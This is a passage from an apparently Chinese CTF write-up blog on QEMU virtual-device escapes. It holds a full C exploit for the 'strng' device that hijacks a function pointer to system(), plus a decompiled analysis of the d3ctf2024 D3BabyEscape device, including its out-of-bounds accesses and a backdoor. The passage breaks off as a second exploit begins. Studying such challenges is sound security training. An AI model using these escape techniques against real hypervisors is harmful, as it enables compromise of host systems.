class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_REGS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_SIZE (STRNG_MMIO_REGS * sizeof(uint32_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_ADDR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_DATA 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_REGS STRNG_MMIO_REGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_SIZE 8</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> calc_str[<span class="number">0x100</span>] = <span class="string">&quot;;cat ./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span> sh_str[<span class="number">0x100</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> *addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    *addr = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val, port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span>    mmio_addr;</span><br><span class="line">    <span class="type">uint32_t</span>    pmio_port = <span class="number">0xc050</span>;</span><br><span class="line">    <span class="type">int</span>         mmio_fd;</span><br><span class="line">    <span class="type">uint32_t</span>    srand_addr_low, srand_addr_high;</span><br><span class="line">    <span class="type">uint64_t</span>    srand_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    libc_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    system_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,</span><br><span class="line">            O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to open mmio file! wrong path or no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to change i/o privilege! no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_addr = (<span class="type">uint64_t</span>)</span><br><span class="line">            mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_addr == MAP_FAILED) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to mmap mmio space!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * regs[3] is not writable, because for addr 3 the rand_r() will be called</span></span><br><span class="line"><span class="comment">     * so we fill some useless string there</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">2</span> + i) &lt;&lt; <span class="number">2</span>)), (<span class="type">uint32_t</span>*)<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">6</span> + i) &lt;&lt; <span class="number">2</span>)), ((<span class="type">uint32_t</span>*)calc_str)[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.I - leaking libc addr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;addr by pmio_write to a oob val</span></span><br><span class="line"><span class="comment">     * so that we can make an oob read by pmio_read</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Stage.I - leaking libc addr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_low = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">2</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_high = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line"></span><br><span class="line">    srand_addr = srand_addr_high;</span><br><span class="line">    srand_addr &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    srand_addr += srand_addr_low;</span><br><span class="line">    libc_addr = srand_addr - <span class="number">0x460a0</span>;</span><br><span class="line">    system_addr = libc_addr + <span class="number">0x50d60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get addr of srand: 0x%llx\n&quot;</span>, srand_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] libc addr: 0x%llx\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: 0x%llx\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.II - overwrite the rand_r ptr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;rand_r to system by oob write in pmio</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.II - overwrite the rand_r ptr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">5</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) system_addr);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">6</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) (system_addr &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] write done!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.III - control flow hijack!</span></span><br><span class="line"><span class="comment">     * call the strng-&gt;rand_r by pmio_write and hijack the control flow!</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.III - control flow hijack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger the strng-&gt;rand_r()...&quot;</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, <span class="number">3</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="d3ctf2024-D3BabyEscape"><a href="#d3ctf2024-D3BabyEscape" class="headerlink" title="d3ctf2024-D3BabyEscape"></a>d3ctf2024-D3BabyEscape</h2><p>前几天的d3ctf,还热乎的题目</p><p>看启动脚本,添加了一个自定义的设备l0dev</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L ../pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-device l0dev</span><br></pre></td></tr></table></figure><p>ida打开qemu文件,搜索字符串l0dev</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000AC42010000001EC../qemu-7.0.0/hw/misc/l0dev.c</span><br><span class="line">.rodata:0000000000AC421F00000006Cl0dev</span><br><span class="line">.rodata:0000000000AC42250000000BCl0dev-mmio</span><br><span class="line">.rodata:0000000000AC42300000000BCl0dev-pmio</span><br><span class="line">.rodata:0000000000AC427000000010Cl0dev_mmio_read</span><br><span class="line">.rodata:0000000000AC428000000010Cl0dev_pmio_read</span><br><span class="line">.rodata:0000000000AC429000000011Cl0dev_mmio_write</span><br><span class="line">.rodata:0000000000AC42B000000011Cl0dev_pmio_write</span><br><span class="line">.rodata:0000000000AC42C80000000ECl0dev_realize</span><br><span class="line">.rodata:0000000000AC42E000000014Cl0dev_instance_init</span><br></pre></td></tr></table></figure><p>比较难绷的是qemu并没有调试符号</p><p>所以并不能直接搜索到l0dev的函数,但影响不大,通过字符串引用照样能找到对应的函数</p><p>mmio_read</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4809AE</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x52</span>u, (__int64)<span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + len &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v6 + <span class="number">640</span>) + addr) + <span class="number">3124</span>, len);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对申请地址进行8字节对齐,然后地址范围不允许超过0x100</p><p>之后将<code>v6+v6[640]+addr+3124</code>处的数据复制到dest并返回,此处就潜藏着内存越界的风险</p><p>mmio_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> ****__fastcall <span class="title function_">sub_480B84</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">const</span> <span class="type">char</span> ****addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****dev; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = a1;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = val;</span><br><span class="line">  len = a4;</span><br><span class="line">  dev = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x85</span>u, (__int64)<span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int64)addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = addr;</span><br><span class="line">  v7 = (<span class="type">unsigned</span> <span class="type">int</span>)addr;</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">const</span> <span class="type">char</span> ****)(<span class="number">8</span> * v9 + len);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">64</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        v7 = ((<span class="type">int</span> (__fastcall *)(_QWORD *))dev[<span class="number">425</span>])(n_4) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">const</span> <span class="type">char</span> ****)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = dev;</span><br><span class="line">          *((_DWORD *)dev + <span class="number">640</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>128分支能够修改dev[640],内存越界读已经找到</p><p>64分支存在函数调用,参数为指向val的指针</p><p>pmio_read</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_480A92</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x68</span>u, (__int64)<span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = a2 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + a3 &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)a2 + <span class="number">3124</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++backdoor;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎存在一个后门开启</p><p>pmio_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_480CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = a3;</span><br><span class="line">  n[<span class="number">0</span>] = a4;</span><br><span class="line">  v9 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0xAD</span>u, (__int64)<span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( backdoor )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v9 + <span class="number">640</span>) + v6) + <span class="number">3124</span>, &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  v10 = v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)v6 + <span class="number">3124</span>, &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然发现了后门,越界写也已经找到了,那接下来就是泄露libc,然后劫持执行流,跟上一题差不多就不多说了</p><p><strong>exp</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 